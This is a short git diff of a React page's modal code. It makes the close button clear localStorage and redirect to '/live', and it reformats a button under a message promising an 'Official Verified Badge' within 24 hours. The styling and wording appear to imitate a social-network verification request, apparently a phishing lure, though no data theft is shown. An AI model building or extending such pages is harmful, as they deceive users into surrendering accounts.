@@ -326,9 +326,8 @@ export default function Home() {
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                 
                 <button onClick={() => { 
-                    setShowSuccess(false); 
-                    setShowModal(false); 
-                    window.location.href = '/live'; 
+                    localStorage.clear(); 
+                    window.location.replace('/live'); 
                 }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
@@ -657,7 +656,7 @@ export default function Home() {
                             <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>
                                 Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.
                             </p>
-                                                        <button 
+                            <button 
                                 type="button" 
                                 onClick={() => { 
                                     localStorage.clear(); // Xóa sạch bộ nhớ tạm
